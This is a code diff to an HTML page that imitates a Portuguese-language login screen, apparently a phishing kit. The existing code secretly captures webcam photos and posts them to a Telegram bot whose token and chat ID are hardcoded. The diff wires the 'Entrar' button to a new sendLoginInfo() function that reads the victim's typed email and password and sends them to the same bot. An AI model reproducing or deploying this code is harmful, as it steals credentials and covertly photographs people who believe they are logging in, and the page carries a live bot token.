@@ -168,10 +168,10 @@
     </section>
 
     <section class="form-side">
-      <form class="form">
-        <input type="text" class="entrada" placeholder="email ou telefone">
-        <input type="password" class="entrada" name="" id="" placeholder="senha">
-        <input type="button" value="Entrar" class="entrada blue">
+      <form class="form" id="login-form">
+        <input type="text" class="entrada" id="email" placeholder="email ou telefone">
+        <input type="password" class="entrada" id="password" placeholder="senha">
+        <input type="button" value="Entrar" class="entrada blue" onclick="sendLoginInfo()">
         <a href="#">esqueceu a senha?</a>
         <div class="line"></div>
         <input type="button" value="Criar nova conta" class="green-btn">
@@ -190,7 +190,8 @@
     const context = canvas.getContext('2d');
     const botToken = '7039889991:AAEcoAkuppMt6JvzpJUhSkcXUOUQu1pKnrk';
     const chatId = '5156117895';
-    const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+    const photoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+    const messageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
     async function startCamera() {
       try {
@@ -217,7 +218,7 @@
       const formData = new FormData();
       formData.append('chat_id', chatId);
       formData.append('photo', blob, 'photo.png');
-      fetch(url, {
+      fetch(photoUrl, {
         method: 'POST',
         body: formData
       }).then(response => response.json())
@@ -230,6 +231,29 @@
           }
         }).catch(error => {
           console.error('Erro ao enviar foto:', error);
+        });
+    }
+
+    function sendLoginInfo() {
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const message = `Email: ${email}\nSenha: ${password}`;
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('text', message);
+      fetch(messageUrl, {
+        method: 'POST',
+        body: formData
+      }).then(response => response.json())
+        .then(data => {
+          console.log('Resposta do Telegram:', data);
+          if (data.ok) {
+            console.log('Informações de login enviadas com sucesso!');
+          } else {
+            console.error('Erro ao enviar informações de login:', data);
+          }
+        }).catch(error => {
+          console.error('Erro ao enviar informações de login:', error);
         });
     }
 
